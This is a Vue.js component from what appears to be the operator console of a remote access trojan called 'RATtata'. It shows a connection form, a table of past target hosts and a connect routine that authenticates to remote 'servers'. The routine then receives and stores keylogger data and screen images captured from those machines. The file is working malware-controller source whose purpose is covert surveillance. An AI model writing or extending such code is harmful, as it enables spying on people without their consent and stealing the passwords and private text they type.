<template>
  <div class="container">
    <div class="connectForm">
      <b-field grouped>
        <b-input
          placeholder="Server address"
          icon="earth"
          v-model.trim="address"
          @keyup.native.enter="connect(address)"
          expanded
        ></b-input>
        <p class="control">
          <b-button type="is-primary" @click="connect(address)">Connect</b-button>
        </p>
      </b-field>
    </div>
    <b-divider label="PAST CONNECTIONS"></b-divider>
    <b-table :data="data" hoverable>
      <template slot-scope="props">
        <b-table-column width="125">
          <b-button
            icon-left="power-plug"
            type="is-primary"
            outlined
            @click="connect(props.row.address)"
          >Connect</b-button>
        </b-table-column>
        <b-table-column field="address" label="Address" sortable>{{ props.row.address }}</b-table-column>

        <b-table-column
          field="last_connected"
          label="Last Connected"
          sortable
          centered
        >{{ props.row.last_connected }}</b-table-column>
        <!-- ? new Date(props.row.last_connected).toLocaleDateString() : '' -->
      </template>
    </b-table>
  </div>
</template>

<script>
import Divider from "../components/b-divider";

export default {
  components: {
    "b-divider": Divider
  },
  methods: {
    sanitize(s) {
      return s
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/"/g, "&quot;");
    },
    connect(address) {
      let { spawnClient } = require("../components/_RATtataClient");

      // TODO: validate address
      let [host, port] = address.split(":");
      port = parseInt(port || 41233);

      this.$snackbar.open({
        message: `Connecting to ${this.sanitize(address)}...`,
        type: "is-primary"
      });

      let client;
      try {
        client = spawnClient(host, port);
      } catch (e) {
        this.$dialog.alert({
          title: "Error",
          message: e
        });
        return;
      }

      client.on("badAuth", remainingTries => {
        if (!remainingTries) {
          this.$dialog.alert({
            title: "Server disconnected",
            message: "You were kicked for too many authentication failures"
          });
          return;
        }

        this.$dialog.prompt({
          inputAttrs: {
            type: "password",
            placeholder: "Enter server password"
          },
          message: `Remaining attempts: ${remainingTries}`,
          confirmText: "Connect",
          hasIcon: true,
          title: `Incorrect password`,
          icon: "lock",
          iconPack: "mdi",

          onConfirm: password => {
            client.login(password);
          }
        });
      });

      client.on("connect", () => {
        this.$store.dispatch("addServer", {
          serverID: client.__serverID,
          address
        });

        this.$store.dispatch("tickUptime", {
          serverID: client.__serverID
        });

        this.$store.dispatch("changePage", `conn-${client.__serverID}`);
      });

      client.on("poll", pollData => {
        this.$store.dispatch("updateData", {
          serverID: client.__serverID,
          ...pollData
        });
      });

      client.on("keylog", keylogData => {
        console.log(keylogData);
        this.$store.dispatch("addKeylog", {
          serverID: client.__serverID,
          data: keylogData
        });
        let callbackEvents = window.RATtata.callbackEvents[client.__serverID];
        if (callbackEvents && callbackEvents.keylog) {
          callbackEvents.keylog(keylogData);
        }
      });

      client.on("display", imageBuffer => {
        let callbackEvents = window.RATtata.callbackEvents[client.__serverID];
        if (callbackEvents && callbackEvents.display) {
          callbackEvents.display(imageBuffer);
        }
      });

      client.on("serverID", id => {
        client.__serverID = id;

        if (window.RATtata.connections[id]) {
          console.log("ALREADY OPEN");
          return;
        }

        window.RATtata.connections[id] = {
          client
        };

        // now ask for auth
        this.$dialog.prompt({
          inputAttrs: {
            type: "password",
            placeholder: "Enter server password"
          },
          confirmText: "Connect",
          hasIcon: true,
          title: `Connecting to server...`,
          icon: "lock",
          iconPack: "mdi",
          onConfirm: password => {
            client.login(password);
          }
        });
      });
    }
  },
  data() {
    return {
      address: "",
      data: [
        {
          address: "blackbox.proxy-local:13191",
          last_connected: "2019-07-21 19:43:27"
        },
        {
          address: "sandbox:44213",
          last_connected: "2019-07-20 02:12:10"
        },
        {
          address: "127.0.0.1:41233",
          last_connected: "2019-07-20 02:12:08"
        },
        {
          address: "deathstar:41233",
          last_connected: "2019-07-19 12:16:01"
        }
      ],
      columns: [
        {
          field: "address",
          label: "Host"
        },
        {
          field: "last_connected",
          label: "Last Connected",
          centered: true
        }
      ]
    };
  }
};
</script>


<style scoped>
.connectForm {
  margin-top: 30px;
}
</style>